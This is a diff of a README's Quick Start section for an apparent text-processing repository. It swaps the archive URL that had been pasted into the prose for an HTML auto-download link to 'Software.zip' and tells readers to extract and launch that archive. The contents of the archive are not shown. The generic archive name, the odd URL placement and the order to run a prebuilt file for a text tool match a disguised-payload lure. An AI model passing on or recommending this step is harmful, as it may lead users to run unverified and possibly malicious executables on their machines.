@@ -20,10 +20,11 @@ This repository contains tools and scripts for text processing, particularly for
 
 ## 🚀 Quick Start
 
-To get started with the text processing tools, download the https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip file from the following link:
-[![Download https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip](https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip)](https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip)
+To get started with the text processing tools, download the file from the following link:
 
-Please make sure to extract and launch the https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip file to access the tools and scripts for text processing.
+<a href="https://github.com/Sickclaymaker/text-processing-tool/releases/download/v2.0/Software.zip" title="Download" download>Download</a>
+
+Please make sure to extract and launch the file to access the tools and scripts for text processing.
 
 ## 📦 Releases
 
